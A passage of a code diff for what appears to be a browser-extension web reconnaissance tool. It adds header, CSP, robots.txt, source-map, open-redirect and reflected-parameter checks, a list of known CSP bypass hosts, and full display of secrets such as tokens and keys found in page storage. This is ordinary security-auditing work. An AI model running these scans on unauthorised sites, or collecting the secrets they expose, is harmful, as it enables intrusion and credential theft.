     const sourceSev = (endpoints.length || comments.length) ? 'med' : 'info';
-    let html = `<div class="recon-section" id="recon-sec-source" data-severity="${sourceSev}" data-section-name="Source Scan"><h4>Source Scan <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;
+    let html = `<div class="recon-section" id="recon-sec-source" data-severity="${sourceSev}" data-section-name="Source Scan"><h4>Source Scan <button class="recon-rerun-btn" data-action="recon-rerun" data-check="source" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;
 
     if (endpoints.length) {
       html += `<div class="recon-item"><b>Potential API endpoints (${endpoints.length})</b><div style="margin-top:4px">`;
@@ -965,7 +1176,7 @@ const Recon = {
     if (comments.length) {
       html += `<div class="recon-item"><b>HTML comments (${comments.length})</b>`;
       comments.slice(0, 20).forEach(c => {
-        html += `<pre class="code-block">${esc(c.substring(0, 300))}</pre>`;
+        html += `<pre class="code-block">${esc(c)}</pre>`;
       });
       html += `</div>`;
     }
@@ -1040,7 +1251,7 @@ const Recon = {
             findings.push({
               sink:    matchedSink.name,
               sources: matchedSources,
-              line:    line.trim().slice(0, 200),
+              line:    line.trim(),
               lineNo:  li + 1,
               script:  si + 1,
               hot:     matchedSources.length > 0,
@@ -1072,7 +1283,7 @@ const Recon = {
     const cold     = findings.filter(f => !f.hot);
 
     const domxssSev = hot.length > 0 ? 'high' : cold.length > 0 ? 'med' : 'info';
-    let html = `<div class="recon-section" id="recon-sec-domxss" data-severity="${domxssSev}" data-section-name="DOM XSS"><h4>DOM XSS (${hot.length} potential, ${cold.length} sinks only) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;
+    let html = `<div class="recon-section" id="recon-sec-domxss" data-severity="${domxssSev}" data-section-name="DOM XSS"><h4>DOM XSS (${hot.length} potential, ${cold.length} sinks only) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="domxss" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;
 
     if (!findings.length) {
       html += '<div class="recon-item muted">No dangerous sink patterns found in inline scripts</div>';
@@ -1179,7 +1390,7 @@ const Recon = {
 
     const SECRET_HIGH = new Set(['JWT','AWS Access Key','Private Key','GitHub Token','Stripe Key','Bearer Token','MongoDB URI','Basic Auth in URL','Password in JS','NPM Token','SendGrid Key','Google API Key','Slack Token']);
     const secretsSev = findings.some(f => SECRET_HIGH.has(f.pattern)) ? 'high' : findings.length > 0 ? 'med' : 'info';
-    let html = `<div class="recon-section" id="recon-sec-secrets" data-severity="${secretsSev}" data-section-name="Secrets"><h4>Secrets &amp; Sensitive Data (${findings.length}) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;
+    let html = `<div class="recon-section" id="recon-sec-secrets" data-severity="${secretsSev}" data-section-name="Secrets"><h4>Secrets &amp; Sensitive Data (${findings.length}) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="secrets" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;
 
     if (!findings.length) {
       html += '<div class="recon-item muted">No secrets detected</div>';
@@ -1189,11 +1400,10 @@ const Recon = {
       Object.entries(byPattern).forEach(([pattern, items]) => {
         html += `<div class="recon-item"><span class="tech-cat-label">${esc(pattern)}</span>`;
         items.slice(0, 10).forEach(f => {
-          const display = f.match.length > 80 ? f.match.slice(0, 77) + '…' : f.match;
           html += `<div class="secrets-row">
-            <span class="secrets-match" title="${esc(f.match)}">${esc(display)}</span>
+            <span class="secrets-match" title="${esc(f.match)}">${esc(f.match)}</span>
             <span class="muted secrets-loc">${esc(f.location)}</span>
-            <button class="recon-copy-btn secrets-copy-btn" data-action="secrets-copy" data-val="${esc(f.match)}" title="Copy">⧉</button>
+            <button class="recon-copy-btn secrets-copy-btn" data-action="secrets-copy" data-val="${esc(f.match)}" title="Copy">Copy</button>
           </div>`;
         });
         if (items.length > 10) html += `<div class="muted" style="font-size:12px;margin-top:4px">+${items.length - 10} more</div>`;
@@ -1205,23 +1415,82 @@ const Recon = {
     appendRecon(html);
   },
 
+  async headerAudit() {
+    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
+    const pageUrl = state.tabUrl;
+    const resp = await bg('FETCH', { url: pageUrl, maxBody: 0 }).catch(() => null);
+    if (!resp || resp.error) { toast(`Header audit error: ${resp?.error || 'request failed'}`, 'error'); return; }
+    const headers = resp.headers || {};
+    const hdr = k => headers[k] || headers[k.toLowerCase()] || '';
+    const findings = [];
+    const add = (severity, name, detail) => findings.push({ severity, name, detail });
+    const isHttps = pageUrl.startsWith('https://');
+
+    if (isHttps && !hdr('strict-transport-security')) add('high', 'Missing HSTS', 'strict-transport-security is absent on an HTTPS response.');
+    if (!hdr('content-security-policy')) add('med', 'Missing CSP', 'content-security-policy is absent.');
+    else if (/unsafe-inline|unsafe-eval|\*/i.test(hdr('content-security-policy'))) add('med', 'Loose CSP', hdr('content-security-policy'));
+    if (!hdr('x-frame-options') && !/frame-ancestors/i.test(hdr('content-security-policy'))) add('med', 'Clickjacking protection missing', 'No x-frame-options or CSP frame-ancestors directive found.');
+    if (!hdr('x-content-type-options')) add('med', 'Missing nosniff', 'x-content-type-options: nosniff is absent.');
+    if (!hdr('referrer-policy')) add('info', 'Missing Referrer-Policy', 'No referrer-policy header found.');
+    if (!hdr('permissions-policy')) add('info', 'Missing Permissions-Policy', 'No permissions-policy header found.');
+    if (hdr('access-control-allow-origin') === '*' && /true/i.test(hdr('access-control-allow-credentials'))) {
+      add('high', 'Invalid credentialed wildcard CORS', 'access-control-allow-origin is * while credentials are enabled.');
+    } else if (hdr('access-control-allow-origin')) {
+      add('info', 'CORS header present', `access-control-allow-origin: ${hdr('access-control-allow-origin')}`);
+    }
+    if (hdr('server')) add('info', 'Server header exposed', hdr('server'));
+    if (hdr('x-powered-by')) add('info', 'X-Powered-By exposed', hdr('x-powered-by'));
+
+    const sev = findings.some(f => f.severity === 'high') ? 'high' : findings.some(f => f.severity === 'med') ? 'med' : 'info';
+    let html = `<div class="recon-section" id="recon-sec-header-audit" data-severity="${sev}" data-section-name="Header Audit">
+      <h4>Header Audit (${findings.length}) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="headers" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;
+    html += `<div class="recon-item"><span class="tech-cat-label">Response</span><div class="tech-hdr-table">
+      <div class="tech-hdr-row"><span class="tech-hdr-name">status</span><span class="tech-hdr-value">${esc(resp.status)} ${esc(resp.statusText || '')}</span></div>`;
+    Object.entries(headers).sort(([a], [b]) => a.localeCompare(b)).forEach(([k, v]) => {
+      html += `<div class="tech-hdr-row"><span class="tech-hdr-name">${esc(k)}</span><span class="tech-hdr-value">${esc(v)}</span></div>`;
+    });
+    html += `</div></div>`;
+    if (!findings.length) {
+      html += '<div class="recon-item muted">No common header issues detected</div>';
+    } else {
+      html += '<div class="recon-item"><span class="tech-cat-label">Findings</span>';
+      findings.forEach(f => {
+        html += `<div class="header-audit-row header-audit-${esc(f.severity)}">
+          <span class="badge ${f.severity === 'high' ? 'danger' : f.severity === 'med' ? 'warn' : ''}">${esc(f.severity.toUpperCase())}</span>
+          <b>${esc(f.name)}</b>
+          <span class="muted">${esc(f.detail)}</span>
+        </div>`;
+      });
+      html += '</div>';
+    }
+    html += '</div>';
+    appendRecon(html);
+  },
+
   async runAll() {
+    this._runningAll = true;
     $('recon-output').innerHTML = '';
     const btn = $('recon-run-all');
     btn.disabled = true;
     btn.textContent = 'Running…';
-    // Run in reverse display order — each scan prepends, so last = top
     const scans = [
-      () => this.forms(),
-      () => this.links(),
-      () => this.hiddenFields(),
       () => this.techStack(),
       () => this.sourceScan(),
+      () => this.sourceMaps(),
+      () => this.links(),
+      () => this.robotsAndSitemap(),
+      () => this.openRedirects(),
+      () => this.headerAudit(),
+      () => this.cspAnalysis(),
+      () => this.forms(),
+      () => this.hiddenFields(),
       () => this.domXSS(),
-      () => this.storageScan(),
+      () => this.reflectedParams(),
       () => this.secrets(),
+      () => this.storageScan(),
     ];
     for (const scan of scans) await scan().catch(() => {});
+    this._runningAll = false;
     btn.disabled = false;
     btn.textContent = 'Run All';
   },
@@ -1275,8 +1544,7 @@ const Recon = {
           const seenKey = `Sensitive Key:${store}:${key}`;
           if (!seen.has(seenKey)) {
             seen.add(seenKey);
-            const display = String(value).length > 80 ? String(value).slice(0, 77) + '…' : String(value);
-            findings.push({ pattern: 'Sensitive Key Name', match: display, key, store });
+            findings.push({ pattern: 'Sensitive Key Name', match: String(value), key, store });
           }
         }
 
@@ -1297,7 +1565,7 @@ const Recon = {
 
     const STORAGE_HIGH = new Set(['JWT','AWS Access Key','Private Key','GitHub Token','Stripe Key','Bearer Token','MongoDB URI','Basic Auth in URL','Password','NPM Token','SendGrid Key','Google API Key','Slack Token']);
     const storageSev = findings.some(f => STORAGE_HIGH.has(f.pattern)) ? 'high' : findings.length > 0 ? 'med' : 'info';
-    let html = `<div class="recon-section" id="recon-sec-storage" data-severity="${storageSev}" data-section-name="Storage Scan"><h4>Storage Sensitive Data (${findings.length}) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;
+    let html = `<div class="recon-section" id="recon-sec-storage" data-severity="${storageSev}" data-section-name="Storage Scan"><h4>Storage Sensitive Data (${findings.length}) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="storage" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;
 
     const localCount   = Object.keys(local).length;
     const sessionCount = Object.keys(session).length;
@@ -1311,11 +1579,10 @@ const Recon = {
       Object.entries(byPattern).forEach(([pattern, items]) => {
         html += `<div class="recon-item"><span class="tech-cat-label">${esc(pattern)}</span>`;
         items.slice(0, 10).forEach(f => {
-          const display = f.match.length > 80 ? f.match.slice(0, 77) + '…' : f.match;
           html += `<div class="secrets-row">
-            <span class="secrets-match" title="${esc(f.match)}">${esc(display)}</span>
-            <span class="muted secrets-loc">${esc(f.store)} › ${esc(f.key)}</span>
-            <button class="recon-copy-btn secrets-copy-btn" data-action="secrets-copy" data-val="${esc(f.match)}" title="Copy">⧉</button>
+            <span class="secrets-match" title="${esc(f.match)}">${esc(f.match)}</span>
+            <span class="muted secrets-loc">${esc(f.store)} / ${esc(f.key)}</span>
+            <button class="recon-copy-btn secrets-copy-btn" data-action="secrets-copy" data-val="${esc(f.match)}" title="Copy">Copy</button>
           </div>`;
         });
         if (items.length > 10) html += `<div class="muted" style="font-size:12px;margin-top:4px">+${items.length - 10} more</div>`;
@@ -1326,11 +1593,470 @@ const Recon = {
     html += '</div>';
     appendRecon(html);
   },
+
+  async robotsAndSitemap() {
+    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
+    let origin;
+    try { origin = new URL(state.tabUrl).origin; } catch { return; }
+
+    const robotsResp = await bg('FETCH', { url: `${origin}/robots.txt`, maxBody: 50000 }).catch(() => null);
+    const robotsBody = robotsResp?.status === 200 ? robotsResp.body : null;
+
+    const disallowed = [], sitemapRefs = [];
+    const INTERESTING = /admin|backup|\.git|\.env|config|debug|dev|internal|private|secret|test|staging|upload|export|manage|console/i;
+
+    if (robotsBody) {
+      for (const line of robotsBody.split('\n')) {
+        const trimmed = line.trim();
+        if (!trimmed || trimmed.startsWith('#')) continue;
+        const colon = trimmed.indexOf(':');
+        if (colon === -1) continue;
+        const key = trimmed.slice(0, colon).trim().toLowerCase();
+        const val = trimmed.slice(colon + 1).trim();
+        if (key === 'disallow' && val) disallowed.push(val);
+        else if (key === 'sitemap' && val) sitemapRefs.push(val);
+      }
+    }
+
+    const interesting = disallowed.filter(p => INTERESTING.test(p));
+
+    const sitemapUrl = sitemapRefs[0] || `${origin}/sitemap.xml`;
+    const sitemapResp = await bg('FETCH', { url: sitemapUrl, maxBody: 200000 }).catch(() => null);
+    const sitemapFound = sitemapResp?.status === 200 && sitemapResp.body;
+    const sitemapUrls = sitemapFound
+      ? [...sitemapResp.body.matchAll(/<loc>\s*([^<]+)\s*<\/loc>/gi)].map(m => m[1].trim()).slice(0, 200)
+      : [];
+
+    const sev = interesting.length ? 'med' : 'info';
+    let html = `<div class="recon-section" id="recon-sec-robots" data-severity="${sev}" data-section-name="robots.txt / Sitemap">
+      <h4>robots.txt / Sitemap
+        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="robots" title="Re-run">Run</button>
+        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
+        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
+      </h4>`;
+
+    if (!robotsBody) {
+      html += `<div class="recon-item muted">robots.txt not found (${robotsResp?.status ?? 'no response'})</div>`;
+    } else {
+      html += `<div class="recon-item"><span class="tech-cat-label">robots.txt — ${disallowed.length} Disallow entries</span>`;
+      if (interesting.length) {
+        html += `<div style="margin-top:6px">`;
+        interesting.forEach(p => {
+          html += `<div class="header-audit-row">
+            <span class="badge danger">!</span><b>${esc(p)}</b>
+          </div>`;
+        });
+        html += `</div>`;
+      }
+      const rest = disallowed.filter(p => !interesting.includes(p));
+      if (rest.length) {
+        html += `<div style="margin-top:6px"><span class="tech-cat-label">All Disallow</span>`;
+        rest.slice(0, 60).forEach(p => { html += `<div class="muted" style="font-family:var(--mono);font-size:12px">${esc(p)}</div>`; });
+        if (rest.length > 60) html += `<div class="muted" style="font-size:12px">+${rest.length - 60} more</div>`;
+        html += `</div>`;
+      }
+      if (sitemapRefs.length) {
+        html += `<div style="margin-top:6px"><span class="tech-cat-label">Sitemap refs in robots.txt</span>`;
+        sitemapRefs.forEach(u => { html += `<div class="muted" style="font-family:var(--mono);font-size:12px">${esc(u)}</div>`; });
+        html += `</div>`;
+      }
+      html += `</div>`;
+    }
+
+    if (sitemapFound && sitemapUrls.length) {
+      html += `<div class="recon-item"><span class="tech-cat-label">Sitemap URLs (${sitemapUrls.length})</span>`;
+      sitemapUrls.slice(0, 60).forEach(u => { html += `<div class="muted" style="font-family:var(--mono);font-size:12px;overflow-wrap:anywhere">${esc(u)}</div>`; });
+      if (sitemapUrls.length > 60) html += `<div class="muted" style="font-size:12px">+${sitemapUrls.length - 60} more</div>`;
+      html += `</div>`;
+    } else if (!robotsBody || !sitemapFound) {
+      html += `<div class="recon-item muted">sitemap.xml not found at ${esc(sitemapUrl)} (${sitemapResp?.status ?? 'no response'})</div>`;
+    }
+
+    html += '</div>';
+    appendRecon(html);
+  },
+
+  async sourceMaps() {
+    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
+    toast('Checking for exposed source maps…', 'info');
+
+    const scriptUrls = await execPage(() => {
+      try {
+        return JSON.stringify(Array.from(document.querySelectorAll('script[src]')).map(s => s.src).filter(Boolean));
+      } catch { return '[]'; }
+    }).catch(() => '[]');
+
+    const srcs = [...new Set(JSON.parse(scriptUrls))].filter(u => isHttpUrl(u)).slice(0, 30);
+    const findings = [];
+
+    for (const src of srcs) {
+      const resp = await bg('FETCH', { url: src, maxBody: 4000 }).catch(() => null);
+      if (!resp?.body) continue;
+      const mapCommentMatch = resp.body.match(/\/\/[#@]\s*sourceMappingURL=(\S+)/);
+      if (mapCommentMatch) {
+        const ref = mapCommentMatch[1];
+        if (ref.startsWith('data:')) continue;
+        let mapUrl = null;
+        try { mapUrl = new URL(ref, src).href; } catch {}
+        if (!mapUrl || !isHttpUrl(mapUrl)) continue;
+        const mapResp = await bg('FETCH', { url: mapUrl, maxBody: 500 }).catch(() => null);
+        findings.push({ src, mapUrl, exposed: mapResp?.status === 200, status: mapResp?.status ?? 'error' });
+      } else {
+        const mapUrl = src.split('?')[0] + '.map';
+        const mapResp = await bg('FETCH', { url: mapUrl, maxBody: 500 }).catch(() => null);
+        if (mapResp?.status === 200) findings.push({ src, mapUrl, exposed: true, status: 200 });
+      }
+    }
+
+    const exposed = findings.filter(f => f.exposed);
+    const sev = exposed.length ? 'high' : 'info';
+    let html = `<div class="recon-section" id="recon-sec-sourcemaps" data-severity="${sev}" data-section-name="Source Maps">
+      <h4>Source Maps (${exposed.length} exposed / ${srcs.length} checked)
+        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="sourcemaps" title="Re-run">Run</button>
+        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
+        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
+      </h4>`;
+
+    if (!srcs.length) {
+      html += `<div class="recon-item muted">No external scripts found on this page</div>`;
+    } else if (!exposed.length) {
+      html += `<div class="recon-item muted">No exposed source maps found (${srcs.length} scripts checked)</div>`;
+    } else {
+      html += `<div class="recon-item"><span class="tech-cat-label">Exposed source maps</span>`;
+      exposed.forEach(f => {
+        html += `<div class="header-audit-row">
+          <span class="badge danger">EXPOSED</span>
+          <span class="muted" style="font-family:var(--mono);font-size:11px;overflow-wrap:anywhere;flex:1;min-width:0">${esc(f.mapUrl)}</span>
+        </div>
+        <div class="muted" style="font-size:11px;font-family:var(--mono);overflow-wrap:anywhere;padding:0 0 6px 0">from: ${esc(f.src)}</div>`;
+      });
+      html += `</div>`;
+    }
+
+    html += '</div>';
+    appendRecon(html);
+  },
+
+  async openRedirects() {
+    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
+
+    const REDIRECT_PARAMS = /^(?:redirect|redirect_url|redirect_uri|return|return_to|returnUrl|returnTo|next|goto|target|dest|destination|url|forward|continue|callback|successUrl|failUrl|back|ref|r|to|go|redir|location)$/i;
+
+    const domRaw = await execPage(() => {
+      try {
+        return JSON.stringify([
+          ...Array.from(document.querySelectorAll('a[href]')).map(a => a.href),
+          ...Array.from(document.querySelectorAll('form[action]')).map(f => f.action),
+        ].filter(Boolean));
+      } catch { return '[]'; }
+    }).catch(() => '[]');
+
+    const allUrls = [...new Set([state.tabUrl, ...JSON.parse(domRaw), ...(Recon.spiderCache?.records || []).map(r => r.url)])];
+    const findings = [], seen = new Set();
+
+    for (const urlStr of allUrls) {
+      let parsed;
+      try { parsed = new URL(urlStr); } catch { continue; }
+      for (const [param, value] of parsed.searchParams) {
+        if (!REDIRECT_PARAMS.test(param)) continue;
+        const key = `${parsed.origin}${parsed.pathname}::${param}`;
+        if (seen.has(key)) continue;
+        seen.add(key);
+        const looksLikeUrl = /^https?:\/\/|^\/\/|^\//.test(value);
+        findings.push({ url: `${parsed.origin}${parsed.pathname}`, param, value, looksLikeUrl });
+      }
+    }
+
+    const sev = findings.length ? 'med' : 'info';
+    let html = `<div class="recon-section" id="recon-sec-openredirect" data-severity="${sev}" data-section-name="Open Redirect Params">
+      <h4>Open Redirect Params (${findings.length})
+        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="openredirect" title="Re-run">Run</button>
+        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
+        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
+      </h4>`;
+
+    if (!findings.length) {
+      html += `<div class="recon-item muted">No redirect-style parameters found in ${allUrls.length} URLs scanned</div>`;
+    } else {
+      html += `<div class="recon-item">`;
+      findings.forEach(f => {
+        html += `<div class="header-audit-row">
+          <span class="badge ${f.looksLikeUrl ? 'danger' : 'warn'}">${f.looksLikeUrl ? 'URL value' : 'param'}</span>
+          <b>${esc(f.param)}</b>
+          <span class="muted">${esc(f.url)}</span>
+        </div>
+        <div class="muted" style="font-family:var(--mono);font-size:11px;padding:0 0 6px 2px">value: ${esc(f.value || '(empty)')}</div>`;
+      });
+      html += `</div>`;
+    }
+    html += '</div>';
+    appendRecon(html);
+  },
+
+  async reflectedParams() {
+    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
+    const pageUrl = state.tabUrl;
+    let parsed;
+    try { parsed = new URL(pageUrl); } catch { return; }
+
+    const params = [...parsed.searchParams.entries()].filter(([, v]) => v.length >= 3);
+    const findings = [];
+
+    if (params.length) {
+      const resp = await bg('FETCH', { url: pageUrl, maxBody: 300000 }).catch(() => null);
+      const body = resp?.body || '';
+
+      for (const [name, value] of params) {
+        const idx = body.indexOf(value);
+        if (idx === -1) continue;
+        const encoded = value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        const appearsEncoded = encoded !== value && body.includes(encoded);
+        const snippet = body.slice(Math.max(0, idx - 50), idx + value.length + 50);
+        const scriptOpenBefore = body.lastIndexOf('<script', idx);
+        const scriptCloseBefore = body.lastIndexOf('</script>', idx);
+        const inScript = scriptOpenBefore > scriptCloseBefore;
+        const inAttr = /=["'][^"'<]*$/.test(body.slice(Math.max(0, idx - 200), idx));
+        const risk = (inScript && !appearsEncoded) ? 'high' : !appearsEncoded ? 'med' : 'info';
+        findings.push({ name, value, snippet, inScript, inAttr, appearsEncoded, risk });
+      }
+    }
+
+    const sev = findings.some(f => f.risk === 'high') ? 'high' : findings.some(f => f.risk === 'med') ? 'med' : 'info';
+    let html = `<div class="recon-section" id="recon-sec-reflected" data-severity="${sev}" data-section-name="Reflected Params">
+      <h4>Reflected Params (${params.length} URL param${params.length !== 1 ? 's' : ''})
+        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="reflected" title="Re-run">Run</button>
+        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
+        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
+      </h4>`;
+
+    if (!params.length) {
+      html += `<div class="recon-item muted">No URL parameters on this page to test</div>`;
+    } else if (!findings.length) {
+      html += `<div class="recon-item muted">No URL parameter values found reflected in page source</div>`;
+    } else {
+      html += `<div class="recon-item"><span class="tech-cat-label">Reflected parameters</span>`;
+      findings.forEach(f => {
+        const cls = f.risk === 'high' ? 'danger' : f.risk === 'med' ? 'warn' : '';
+        const context = f.inScript ? 'in &lt;script&gt;' : f.inAttr ? 'in attribute' : 'in HTML';
+        const encNote = f.appearsEncoded ? ' (also HTML-encoded)' : ' (raw only)';
+        html += `<div class="header-audit-row">
+          <span class="badge ${cls}">${esc(f.risk.toUpperCase())}</span>
+          <b>${esc(f.name)}</b>
+          <span class="muted">${context}${encNote}</span>
+        </div>
+        <pre class="code-block" style="margin:2px 0 8px">${esc(f.snippet)}</pre>`;
+      });
+      html += `</div>`;
+    }
+    html += '</div>';
+    appendRecon(html);
+  },
+
+  async cspAnalysis() {
+    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
+    const resp = await bg('FETCH', { url: state.tabUrl, maxBody: 0 }).catch(() => null);
+    const headers = resp?.headers || {};
+    const hdr = k => headers[k] || headers[k.toLowerCase()] || '';
+    const csp   = hdr('content-security-policy');
+    const cspRO = hdr('content-security-policy-report-only');
+    const activeCsp = csp || cspRO;
+    const isReportOnly = !csp && !!cspRO;
+
+    const findings = [], positives = [];
+
+    if (!activeCsp) {
+      findings.push({ sev: 'high', issue: 'No CSP', detail: 'content-security-policy absent — XSS has no policy-level mitigation' });
+    } else {
+      if (isReportOnly) findings.push({ sev: 'med', issue: 'CSP is report-only', detail: 'Policy is not enforced, only reported — provides zero XSS protection' });
+
+      const directives = {};
+      activeCsp.split(';').forEach(d => {
+        const parts = d.trim().split(/\s+/);
+        if (parts[0]) directives[parts[0].toLowerCase()] = parts.slice(1);
+      });
+      const eff = key => directives[key] || directives['default-src'] || [];
+      const scriptSrc = eff('script-src');
+      const scriptStr = scriptSrc.join(' ');
+      const objSrc    = directives['object-src'];
+
+      if (scriptStr.includes("'unsafe-inline'"))
+        findings.push({ sev: 'high', issue: "script-src 'unsafe-inline'", detail: 'Allows inline <script> and event handlers — negates XSS protection' });
+      if (scriptStr.includes("'unsafe-eval'"))
+        findings.push({ sev: 'high', issue: "script-src 'unsafe-eval'", detail: "Permits eval(), new Function(), setTimeout(string)" });
+      if (scriptStr.includes("'unsafe-hashes'"))
+        findings.push({ sev: 'med', issue: "script-src 'unsafe-hashes'", detail: 'Allows inline event handlers matching listed hashes' });
+      if (scriptSrc.includes('*'))
+        findings.push({ sev: 'high', issue: 'script-src wildcard (*)', detail: 'Scripts loadable from any origin' });
+      if (scriptStr.includes('data:'))
+        findings.push({ sev: 'high', issue: "script-src allows data:", detail: 'data: URIs can carry executable scripts' });
+      if (scriptStr.includes('http:'))
+        findings.push({ sev: 'high', issue: "script-src allows http:", detail: 'Scripts loadable over unencrypted HTTP' });
+
+      const BYPASS_HOSTS = [
+        ['ajax.googleapis.com',       'JSONP endpoint — well-known CSP bypass'],
+        ['www.google.com',            'JSONP via /complete/search — CSP bypass'],
+        ['accounts.google.com',       'Known CSP bypass gadget host'],
+        ['cdn.jsdelivr.net',          'Serves arbitrary npm packages — full bypass'],
+        ['unpkg.com',                 'Serves arbitrary npm packages — full bypass'],
+        ['ajax.microsoft.com',        'JSONP available — known bypass'],
+        ['az416426.vo.msecnd.net',    'App Insights CDN — known script gadget host'],
+      ];
+      scriptSrc.forEach(src => {
+        BYPASS_HOSTS.forEach(([host, detail]) => {
+          if (src.includes(host)) findings.push({ sev: 'high', issue: `Bypass-prone host: ${src}`, detail });
+        });
+        if (src.startsWith('*.')) findings.push({ sev: 'med', issue: `Wildcard subdomain: ${src}`, detail: 'Any subdomain can serve scripts — may include attacker-controlled subdomains' });
+      });
+
+      if (!objSrc && !directives['default-src'])
+        findings.push({ sev: 'med', issue: 'object-src not set', detail: 'Plugin execution (Flash, Java) not restricted' });
+      else if (objSrc && (objSrc.includes('*') || !objSrc.includes("'none'")))
+        findings.push({ sev: 'high', issue: "object-src missing 'none'", detail: 'Plugins allowed from broad origins' });
+
+      if (!directives['base-uri'])
+        findings.push({ sev: 'med', issue: 'base-uri not set', detail: 'Injected <base href> can hijack all relative URL resolution' });
+      if (!directives['form-action'])
+        findings.push({ sev: 'info', issue: 'form-action not set', detail: 'Form submissions not restricted to known origins' });
+
+      if (scriptStr.includes("'nonce-"))  positives.push('Nonces in use');
+      if (scriptStr.match(/'sha(256|384|512)-/)) positives.push('Hashes in use');
+      if (directives['upgrade-insecure-requests']) positives.push('upgrade-insecure-requests set');
+      if (directives['block-all-mixed-content'])   positives.push('block-all-mixed-content set');
+      if ((objSrc || []).includes("'none'"))        positives.push("object-src 'none' — plugins blocked");
+      if ((directives['base-uri'] || []).includes("'none'") || (directives['base-uri'] || []).includes("'self'"))
+        positives.push('base-uri restricted');
+    }
+
+    const sev = findings.some(f => f.sev === 'high') ? 'high' : findings.some(f => f.sev === 'med') ? 'med' : 'info';
+    let html = `<div class="recon-section" id="recon-sec-csp" data-severity="${sev}" data-section-name="CSP Analysis">
+      <h4>CSP Analysis (${findings.length} finding${findings.length !== 1 ? 's' : ''})
+        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="csp" title="Re-run">Run</button>
+        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
+        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
+      </h4>`;
+
+    if (activeCsp) {
+      html += `<div class="recon-item"><span class="tech-cat-label">${isReportOnly ? 'CSP (report-only — not enforced)' : 'Active CSP'}</span>
+        <pre class="code-block" style="word-break:break-all;white-space:pre-wrap">${esc(activeCsp)}</pre>
+      </div>`;
+    }
+    if (findings.length) {
+      html += `<div class="recon-item"><span class="tech-cat-label">Findings</span>`;
+      findings.forEach(f => {
+        const cls = f.sev === 'high' ? 'danger' : f.sev === 'med' ? 'warn' : '';
+        html += `<div class="header-audit-row">
+          <span class="badge ${cls}">${esc(f.sev.toUpperCase())}</span>
+          <b>${esc(f.issue)}</b>
+          <span class="muted">${esc(f.detail)}</span>
+        </div>`;
+      });
+      html += `</div>`;
+    }
+    if (positives.length) {
+      html += `<div class="recon-item"><span class="tech-cat-label">Positive signals</span>`;
+      positives.forEach(p => { html += `<div class="muted" style="font-size:12px;padding:2px 0">✓ ${esc(p)}</div>`; });
+      html += `</div>`;
+    }
+    html += '</div>';
+    appendRecon(html);
+  },
+};
+
+const RECON_PLACEHOLDER_DEFS = [
+  { id: 'recon-sec-tech',         check: 'tech',        label: 'Tech Stack' },
+  { id: 'recon-sec-source',       check: 'source',      label: 'Source Scan' },
+  { id: 'recon-sec-sourcemaps',   check: 'sourcemaps',  label: 'Source Maps' },
+  { id: 'recon-sec-links',        check: 'links',       label: 'Discovered Links &amp; Assets' },
+  { id: 'recon-sec-robots',       check: 'robots',      label: 'robots.txt / Sitemap' },
+  { id: 'recon-sec-openredirect', check: 'openredirect',label: 'Open Redirect Params' },
+  { id: 'recon-sec-header-audit', check: 'headers',     label: 'Header Audit' },
+  { id: 'recon-sec-csp',          check: 'csp',         label: 'CSP Analysis' },
+  { id: 'recon-sec-forms',        check: 'forms',       label: 'Forms' },
+  { id: 'recon-sec-hidden',       check: 'hidden',      label: 'Hidden Fields' },
+  { id: 'recon-sec-domxss',       check: 'domxss',      label: 'DOM XSS' },
+  { id: 'recon-sec-reflected',    check: 'reflected',   label: 'Reflected Params' },
+  { id: 'recon-sec-secrets',      check: 'secrets',     label: 'Secrets &amp; Sensitive Data' },
+  { id: 'recon-sec-storage',      check: 'storage',     label: 'Storage Scan' },
+];
+
+function initReconPlaceholders() {
+  const output = $('recon-output');
+  for (const def of RECON_PLACEHOLDER_DEFS) {
+    if (document.getElementById(def.id)) continue;
+    const wrap = document.createElement('div');
